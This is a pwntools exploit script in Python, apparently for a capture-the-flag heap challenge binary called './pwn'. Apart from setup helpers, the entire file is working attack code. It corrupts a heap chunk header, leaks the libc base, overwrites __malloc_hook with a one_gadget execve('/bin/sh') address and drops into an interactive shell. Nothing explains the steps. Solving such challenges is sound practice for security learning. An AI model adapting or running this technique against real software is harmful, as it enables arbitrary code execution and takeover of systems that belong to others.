from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'>> '
def add():
	sla(menu, b'1')

def edit(idx, content):
	sla(menu, b'2')
	sla(b'idx >> ', byte(idx))
	sda(b'ame >> ', content)

def mal_big():
	sla(menu, b'3')

def show():
	sla(menu, b'4')

def wr(content):
	sla(menu, b'5')
	sda(b'QAQ\n\n', content)
add()
payload = p64(0) + p64(0xd41)
edit(0, payload)
mal_big()
add()
show()
rut(b'1: ')
libc.address = addr64(b'\n') - 0x3ec2a0
print("libc_base : ", hex(libc.address))

"""
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
0x4f302 execve("/bin/sh", rsp+0x40, environ) [rsp+0x40] == NULL
0x10a2fc execve("/bin/sh", rsp+0x70, environ) [rsp+0x70] == NUL
"""
ones = [0x4f2a5, 0x4f302, 0x10a2fc]
ones = [i+libc.address for i in ones]
pay = p64(libc.sym.__malloc_hook-0x60)
wr(pay)
edit(8, p64(ones[1]))
add()

#debug()
sh()
